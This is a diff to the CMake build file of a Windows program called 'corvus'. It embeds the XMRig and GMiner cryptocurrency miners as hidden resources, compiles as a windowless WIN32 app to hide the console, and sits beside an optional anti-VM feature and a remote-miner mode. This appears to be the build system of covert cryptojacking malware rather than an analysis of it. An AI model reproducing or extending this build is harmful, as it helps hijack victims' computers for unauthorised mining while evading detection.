@@ -22,6 +22,7 @@ add_definitions(-DUNICODE -D_UNICODE)
 option(ENABLE_DEBUG_CONSOLE "Enable debug console output" OFF)
 if(ENABLE_DEBUG_CONSOLE)
     message(STATUS "Debug console enabled")
+    add_definitions(-DENABLE_DEBUG_CONSOLE)
 endif()
 
 # Optional Anti-VM feature
@@ -92,8 +93,41 @@ set(SRC_FILES
 
 # Resource files (only if not using remote miners)
 if(NOT ENABLE_REMOTE_MINERS)
+    # Generate RC file based on which miners are enabled
+    set(GENERATED_RC "${CMAKE_CURRENT_BINARY_DIR}/embedded_resource_generated.rc")
+    
+    # Default to CPU miner if neither flag is explicitly set
+    if(NOT DEFINED ENABLE_CPU_MINER)
+        set(ENABLE_CPU_MINER ON)
+    endif()
+    if(NOT DEFINED ENABLE_GPU_MINER)
+        set(ENABLE_GPU_MINER OFF)
+    endif()
+    
+    # Build the RC file content
+    set(RC_CONTENT "#include \"../include/resources.h\"\n")
+    
+    if(ENABLE_CPU_MINER)
+        string(APPEND RC_CONTENT "EMBEDDED_XMRIG RCDATA \"${CMAKE_CURRENT_SOURCE_DIR}/resources/xmrig.exe\"\n")
+        message(STATUS "Embedding CPU miner (XMRig) in resources")
+        add_definitions(-DENABLE_CPU_MINER)
+    endif()
+    
+    if(ENABLE_GPU_MINER)
+        string(APPEND RC_CONTENT "EMBEDDED_GMINER RCDATA \"${CMAKE_CURRENT_SOURCE_DIR}/resources/gminer.exe\"\n")
+        message(STATUS "Embedding GPU miner (GMiner) in resources")
+        add_definitions(-DENABLE_GPU_MINER)
+    endif()
+    
+    if(NOT ENABLE_CPU_MINER AND NOT ENABLE_GPU_MINER)
+        message(WARNING "No miners enabled - at least one miner should be enabled for embedded builds")
+    endif()
+    
+    # Write the generated RC file
+    file(WRITE "${GENERATED_RC}" "${RC_CONTENT}")
+    
     set(RESOURCE_FILES
-        resources/embedded_resource.rc
+        "${GENERATED_RC}"
     )
     message(STATUS "Embedding miner resources in executable")
 else()
@@ -147,13 +181,21 @@ if(NOT MSVC)
 endif()
 set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")
 
-# Create executable
-add_executable(corvus 
-    #WIN32 
-    ${SRC_FILES}
-    ${RESOURCE_FILES}
-    ${HEADER_FILES}
-)
+# Create executable - use WIN32 subsystem unless debug console is enabled
+if(ENABLE_DEBUG_CONSOLE)
+    add_executable(corvus 
+        ${SRC_FILES}
+        ${RESOURCE_FILES}
+        ${HEADER_FILES}
+    )
+else()
+    add_executable(corvus 
+        WIN32
+        ${SRC_FILES}
+        ${RESOURCE_FILES}
+        ${HEADER_FILES}
+    )
+endif()
 
 # Set linker flags for GUI subsystem (hide console)
 set_target_properties(corvus PROPERTIES
@@ -174,6 +216,7 @@ if(MSVC)
 		wbemuuid.lib
 		ole32.lib
 		oleaut32.lib
+		iphlpapi.lib
 	)
 else()
 	target_link_libraries(corvus
@@ -182,6 +225,7 @@ else()
 		-lwbemuuid
 		-lole32
 		-loleaut32
+		-liphlpapi
 	)
 endif()
 
